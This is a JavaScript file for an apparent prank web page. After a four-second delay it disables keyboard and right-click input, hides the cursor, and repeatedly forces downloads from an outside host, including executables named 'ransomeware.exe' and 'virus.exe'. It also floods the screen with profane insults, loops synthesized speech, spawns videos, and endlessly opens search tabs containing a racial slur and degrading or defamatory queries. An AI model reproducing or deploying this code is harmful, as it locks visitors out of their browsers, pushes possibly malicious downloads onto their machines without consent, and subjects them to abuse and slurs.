document.onkeydown = function (e) {
  return false;
};
document.onkeyup = function (e) {
  return false;
};
document.onkeypress = function (e) {
  return false;
};
function redirectOut() {
  document.querySelector(".container").style.display = "none";
}
document.addEventListener("contextmenu", (event) => event.preventDefault());
setTimeout(redirectOut, 3999);
function annoyingWebsite() {
  function annoyingFileDownload() {
    var random = Math.floor(Math.random() * 3);
    var imageAraay = [
      "https://kindevils.rocks/api/raw/?path=/caspi/image0.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
      "https://kindevils.rocks/api/raw/?path=/caspi/image1.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
      "https://kindevils.rocks/api/raw/?path=/caspi/ransomeware.exe&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
      "https://kindevils.rocks/api/raw/?path=/caspi/virus.exe&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7",
    ];
    var imageLink = imageAraay[random];
    var a = document.createElement("a");
    a.href = imageLink;
    a.download = imageLink;
    a.click();
  }

  setInterval(annoyingFileDownload, 1);
  function cursorGone() {
    document.querySelector("html").style = "cursor: none;";
  }
  function annoyingSpeech() {
    window.speechSynthesis.onvoiceschanged = function () {
      var voices = window.speechSynthesis.getVoices();
      for (let i = 0; i <= 8; i++) {
        var random = Math.floor(Math.random() * 8);
        var voiceArray = [0, 1, 2, 3, 4, 6, 7, 8, 9];
        console.log(i, voices[voiceArray[random]]);
        var speechArray = ["you are in a dream. wake up!"];
        function speak() {
          var msg = new SpeechSynthesisUtterance();
          var voices = window.speechSynthesis.getVoices();
          msg.voice = voices[voiceArray[random]];
          msg.voiceURI = "native";
          msg.volume = 1;
          msg.rate = 1;
          msg.pitch = 1;
          msg.lang = "en-Us";
          msg.text = speechArray[0];
          speechSynthesis.speak(msg);
        }
        speak();
      }
    };
  }

  setInterval(annoyingSpeech, 1);
  cursorGone();

  var words = [
    "Fuck your Sister",
    "Fuck your MOM",
    "You Are a Shit",
    "You Are a Motherfucker",
    "You Are a Piece of shit",
    "You Are a Wanker",
    "You Are a Dork",
    "You Are a Fuckface",
    "You Are a Bitch",
    "You Are a Scumbag",
  ];
  function annoyingWords() {
    var fullWidth = window.innerWidth;
    var fullHeight = window.innerHeight;
    var random = Math.floor(Math.random() * 10);

    var elem = document.createElement("p");
    elem.textContent = words[random];
    elem.style.position = "absolute";
    elem.style.left = Math.round(Math.random() * fullWidth) - 150 + "px";
    elem.style.top = Math.round(Math.random() * fullHeight) - 150 + "px";
    elem.style.backgroundColor = "#f20000";
    elem.style.color = "#fff";
    elem.style.height = "80px";
    elem.style.width = "fit-content";
    elem.style.borderRadius = "20px";
    elem.style.paddingLeft = "25px";
    elem.style.paddingRight = "25px";
    elem.style.display = "flex";
    elem.style.justifyContent = "center";
    elem.style.alignItems = "center";
    document.body.appendChild(elem);
  }

  function showVideo() {
    var vidsArray = ["rickroll"];
    var fullWidth = window.innerWidth;
    var fullHeight = window.innerHeight;
    var random = Math.floor(Math.random() * 10);
    var vid = document.createElement("video");
    vid.src = `./vids/${vidsArray[0]}.mp4`;
    vid.loop = true;
    vid.muted = true;
    vid.autoplay = true;
    vid.style.position = "absolute";
    vid.style.left = Math.round(Math.random() * fullWidth) - 150 + "px";
    vid.style.top = Math.round(Math.random() * fullHeight) - 150 + "px";
    vid.style.height = "150px";
    vid.style.width = "250px";
    document.body.appendChild(vid);
  }

  function annoyingTabs() {
    function openTabs() {
      var annoyingSearches = [
        " nigga hoe",
        "gay kissing",
        "meme",
        "american karin",
        "why I am a loser",
        "why everyone hates me",
        "why I am an Anime Character",
        "why she left me",
        "why I am friend with Crypto hell",
        "Kumala-la, Kumala-la, Kumala Savesta",
        "Whay i am a disappointment for my parents",
        "How to be furry",
        "Furrys are fatherless",
        "Mickey mouse is a pedophile",
      ];
      var random = Math.floor(Math.random() * 13);
      window.open("http://google.com/search?q=" + annoyingSearches[random]);
    }
    setInterval(openTabs, 1);
  }
  setTimeout(annoyingTabs, 444);
  var toomanyWords = setInterval(annoyingWords, 1);

  setTimeout(function () {
    clearInterval(toomanyWords);
  }, 333);
  function annoyingVideos() {
    setInterval(showVideo, 111);
  }
  setTimeout(annoyingVideos, 333);
}
setTimeout(annoyingWebsite, 4000);
